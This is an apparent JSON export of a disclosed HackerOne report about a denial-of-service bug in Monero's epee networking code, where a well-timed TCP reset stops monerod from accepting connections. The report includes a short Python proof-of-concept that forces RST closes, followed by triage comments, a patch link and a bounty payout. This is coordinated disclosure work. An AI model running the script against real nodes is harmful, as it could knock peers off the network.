{"id":363714,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjM3MTQ=","url":"https://hackerone.com/reports/363714","title":"monerod can be disabled by a well-timed TCP reset packet","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-06-09T12:09:17.963Z","submitted_at":"2018-06-09T12:09:17.963Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ahook","url":"/ahook","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7731,"url":"https://hackerone.com/monero","handle":"monero","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Monero","twitter_handle":"monero","website":"https://getmonero.org","about":" Monero: the secure, private, untraceable cryptocurrency"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-08-02T00:12:35.066Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-07-27T10:34:01.328Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nA well-timed TCP reset (RST) can cause monerod (or any service relying on epee) to stop accepting new connections.\n\n**Description:**\nWhen a new connection is attempted, the handle_accept function is called. This does some error checking and finishes setting up the connection. Once the connection is set up, it calls acceptor_.async_accept() in order to continue listening for new connections.\n\nhttps://github.com/monero-project/monero/blob/8a7b3ff13858c5d879530c99de5c723c88429342/contrib/epee/include/net/abstract_tcp_server2.inl#L982\n\nHowever, if the handle_accept function is called with an error code, it bypasses the main block of code and simply logs a message. It does not add the accept handler back to the acceptor. The result is that the daemon will stop accepting new connections if an error is hit.\n\nIt is possible for an attacker to remotely trigger such an error. If a TCP RST packet is sent immediately after a successful TCP handshake, the connection/socket will be torn down. If it happens fast enough (specifically in the window between the server receiving the ACK and the handle_accept function being called), this will cause an error.\n\n## Releases Affected:\n\nAll releases using epee.\n\n## Steps To Reproduce:\n\nI've included a python script below which demonstrates a normal TCP connection that ends gracefully, and a malicious connection which causes an RST to be sent at close as opposed to FIN.\n\nIf this is run on a relatively idle node (e.g. if it's still synchronizing its blockchain), it will disable the node after just a couple tries. If a node is fully active, it becomes harder to get the RST processed within the critical window. I have yet to disable a fully active node, but it should be possible. A more efficient/faster attack going over raw sockets might make it easier.\n\n## Supporting Material/References:\n\n$ ./rst-attack.py \u003cip\u003e \u003cport\u003e\n```\n#!/usr/bin/env python3\n  \nimport socket, struct, sys\n\ntgt_host = sys.argv[1]\ntgt_port = int(sys.argv[2])\n\n# Normal connection, send some data, end with graceful FIN.\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)\ns.connect((tgt_host, tgt_port))\ns.send(b\"hello\")\ns.close()\n\n# Abnormal connection, force close by RST instead of FIN.\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)\nl_onoff = 1\nl_linger = 0\np=struct.pack('ii', l_onoff, l_linger)\ns.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, p)\ns.connect((tgt_host, tgt_port))\ns.close()\n```\n\n## Impact\n\nAn attacker can remotely disable monero nodes. I marked this as medium since my proof-of-concept script fails to disable most active nodes. However, it is theoretically possible to take down the whole network if a clever variation or different means of causing an accept error is discovered.\n\nAn attacker could also monitor the network and snipe any nodes that have lagged behind or are in the middle of syncing the chain.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003cbr\u003e\nA well-timed TCP reset (RST) can cause monerod (or any service relying on epee) to stop accepting new connections.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003cbr\u003e\nWhen a new connection is attempted, the handle_accept function is called. This does some error checking and finishes setting up the connection. Once the connection is set up, it calls acceptor_.async_accept() in order to continue listening for new connections.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/monero-project/monero/blob/8a7b3ff13858c5d879530c99de5c723c88429342/contrib/epee/include/net/abstract_tcp_server2.inl#L982\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmonero-project%2Fmonero%2Fblob%2F8a7b3ff13858c5d879530c99de5c723c88429342%2Fcontrib%2Fepee%2Finclude%2Fnet%2Fabstract_tcp_server2.inl%23L982\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/monero-project/monero/blob/8a7b3ff13858c5d879530c99de5c723c88429342/contrib/epee/include/net/abstract_tcp_server2.inl#L982\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eHowever, if the handle_accept function is called with an error code, it bypasses the main block of code and simply logs a message. It does not add the accept handler back to the acceptor. The result is that the daemon will stop accepting new connections if an error is hit.\u003c/p\u003e\n\n\u003cp\u003eIt is possible for an attacker to remotely trigger such an error. If a TCP RST packet is sent immediately after a successful TCP handshake, the connection/socket will be torn down. If it happens fast enough (specifically in the window between the server receiving the ACK and the handle_accept function being called), this will cause an error.\u003c/p\u003e\n\n\u003ch2 id=\"releases-affected\"\u003eReleases Affected:\u003c/h2\u003e\n\n\u003cp\u003eAll releases using epee.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eI\u0026#39;ve included a python script below which demonstrates a normal TCP connection that ends gracefully, and a malicious connection which causes an RST to be sent at close as opposed to FIN.\u003c/p\u003e\n\n\u003cp\u003eIf this is run on a relatively idle node (e.g. if it\u0026#39;s still synchronizing its blockchain), it will disable the node after just a couple tries. If a node is fully active, it becomes harder to get the RST processed within the critical window. I have yet to disable a fully active node, but it should be possible. A more efficient/faster attack going over raw sockets might make it easier.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003e$ ./rst-attack.py \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt;\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e#!/usr/bin/env python3\n\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003esocket\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003estruct\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esys\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003etgt_host\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"n\"\u003etgt_port\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# Normal connection, send some data, end with graceful FIN.\n\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eAF_INET\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eSOCK_STREAM\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003econnect\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003etgt_host\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etgt_port\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hello\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# Abnormal connection, force close by RST instead of FIN.\n\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eAF_INET\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eSOCK_STREAM\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003el_onoff\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003cspan class=\"n\"\u003el_linger\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n\u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003estruct\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epack\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;ii\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003el_onoff\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003el_linger\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esetsockopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eSOL_SOCKET\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eSO_LINGER\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003econnect\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003etgt_host\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etgt_port\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can remotely disable monero nodes. I marked this as medium since my proof-of-concept script fails to disable most active nodes. However, it is theoretically possible to take down the whole network if a clever variation or different means of causing an accept error is discovered.\u003c/p\u003e\n\n\u003cp\u003eAn attacker could also monitor the network and snipe any nodes that have lagged behind or are in the middle of syncing the chain.\u003c/p\u003e\n","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-08-26T10:34:01.467Z","allow_singular_disclosure_after":-73941003.19091016,"singular_disclosure_allowed":true,"vote_count":3,"voters":["cryptographer","hexile","71ck5"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2871192,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"What do you mean by \"disable\"? Can you provide logs? I cannot reproduce. Can you prove that this is an epee-specific issue and not OS-specific (or not boost related)?","markdown_message":"\u003cp\u003eWhat do you mean by \u0026quot;disable\u0026quot;? Can you provide logs? I cannot reproduce. Can you prove that this is an epee-specific issue and not OS-specific (or not boost related)?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-11T20:34:00.495Z","updated_at":"2018-06-11T20:34:00.495Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2872244,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Running this on a loop on my local idle server, I can't repro, it's happily rejecting all connections without wedging. I end up with lots of TIME_WAIT connections, that's all. Anyway, I've verified that forcing an error programmatically stops the accepting, and that restarting on (forced) error continues accepting.","markdown_message":"\u003cp\u003eRunning this on a loop on my local idle server, I can\u0026#39;t repro, it\u0026#39;s happily rejecting all connections without wedging. I end up with lots of TIME_WAIT connections, that\u0026#39;s all. Anyway, I\u0026#39;ve verified that forcing an error programmatically stops the accepting, and that restarting on (forced) error continues accepting.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-12T06:26:31.352Z","updated_at":"2018-06-12T06:26:31.352Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2872256,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"So I can currently reproduce locally on OSX but that's also in a case where my 18080 is closed to the world. I've got a raw socket version running in c on ubuntu and still can't reproduce, but I'm doing more debugging now. It may end up being the case that it's an OSX thing.\n\nI'll keep hammering at it and update if I find anything. Probably a low-severity ticket at this point.","markdown_message":"\u003cp\u003eSo I can currently reproduce locally on OSX but that\u0026#39;s also in a case where my 18080 is closed to the world. I\u0026#39;ve got a raw socket version running in c on ubuntu and still can\u0026#39;t reproduce, but I\u0026#39;m doing more debugging now. It may end up being the case that it\u0026#39;s an OSX thing.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll keep hammering at it and update if I find anything. Probably a low-severity ticket at this point.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-12T06:36:19.121Z","updated_at":"2018-06-12T06:36:19.121Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2875298,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-12T20:48:35.576Z","updated_at":"2018-06-12T20:48:35.576Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2876552,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"From what I can tell this is primarily an OSX issue (or at least I can only trigger it on OSX). Thought it might have been boost (I was running 1.67 on OSX and 1.58 on Ubuntu), but Ubuntu does fine on 1.67. Not sure exactly why they differ, but the stacktraces are fairly different between the two, so it could be epoll vs kqueue, or os-specific thread implementations, etc.\n\nI think it would make sense to add a line to put the handler back after an error to be safe (or maybe check the error code and only do it on certain codes). But since I'm guessing OSX nodes are rare, I'd still probably consider on the lower-medium end of severity.","markdown_message":"\u003cp\u003eFrom what I can tell this is primarily an OSX issue (or at least I can only trigger it on OSX). Thought it might have been boost (I was running 1.67 on OSX and 1.58 on Ubuntu), but Ubuntu does fine on 1.67. Not sure exactly why they differ, but the stacktraces are fairly different between the two, so it could be epoll vs kqueue, or os-specific thread implementations, etc.\u003c/p\u003e\n\n\u003cp\u003eI think it would make sense to add a line to put the handler back after an error to be safe (or maybe check the error code and only do it on certain codes). But since I\u0026#39;m guessing OSX nodes are rare, I\u0026#39;d still probably consider on the lower-medium end of severity.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-13T04:56:52.198Z","updated_at":"2018-06-13T04:56:52.198Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2879500,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, I've done that. Also on exceptions just in case.","markdown_message":"\u003cp\u003eYes, I\u0026#39;ve done that. Also on exceptions just in case.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-13T14:24:06.454Z","updated_at":"2018-06-13T14:24:06.454Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2900439,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, forgot the link to the patch: https://github.com/monero-project/monero/pull/3997","markdown_message":"\u003cp\u003eSorry, forgot the link to the patch: \u003ca title=\"https://github.com/monero-project/monero/pull/3997\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmonero-project%2Fmonero%2Fpull%2F3997\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/monero-project/monero/pull/3997\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-18T10:02:57.141Z","updated_at":"2018-06-18T10:02:57.141Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3105081,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @ahook, thank you for the report. Though neither of us could reproduce, a patch has made its way into https://github.com/monero-project/monero/releases/tag/v0.12.3.0. Please paste an XMR address if you want a bounty payout.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ahook\"\u003e@ahook\u003c/a\u003e, thank you for the report. Though neither of us could reproduce, a patch has made its way into \u003ca title=\"https://github.com/monero-project/monero/releases/tag/v0.12.3.0\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmonero-project%2Fmonero%2Freleases%2Ftag%2Fv0.12.3.0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/monero-project/monero/releases/tag/v0.12.3.0\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Please paste an XMR address if you want a bounty payout.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-27T10:33:49.151Z","updated_at":"2018-07-27T10:33:49.151Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ahook","url":"/ahook"},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3105082,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-27T10:34:01.372Z","updated_at":"2018-07-27T10:34:01.372Z","first_to_agree":true,"actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3106665,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Oh cool, thanks! Here's an XMR address: 44Yg7iSGmrqdow2XKhLWxDMF17JR6SmyHQkNzaeaCiYL2YpMhUcapJ6XvHR1S5Kj87bRoeCmrgTK2Lrn58XiPFSJHtPKgXe","markdown_message":"\u003cp\u003eOh cool, thanks! Here\u0026#39;s an XMR address: 44Yg7iSGmrqdow2XKhLWxDMF17JR6SmyHQkNzaeaCiYL2YpMhUcapJ6XvHR1S5Kj87bRoeCmrgTK2Lrn58XiPFSJHtPKgXe\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-27T18:59:13.520Z","updated_at":"2018-07-27T18:59:36.868Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3129848,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sent 3 XMR: \u003c9177299011332a41cfb7684848fc4ce28150f424a9df5adb766412db2a922118\u003e","markdown_message":"\u003cp\u003eSent 3 XMR: \u0026lt;9177299011332a41cfb7684848fc4ce28150f424a9df5adb766412db2a922118\u0026gt;\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-01T18:35:59.321Z","updated_at":"2018-08-01T18:35:59.321Z","actor":{"username":"luigi1111w","cleared":false,"url":"/luigi1111w","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3130817,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-02T00:12:34.996Z","updated_at":"2018-08-02T00:12:34.996Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}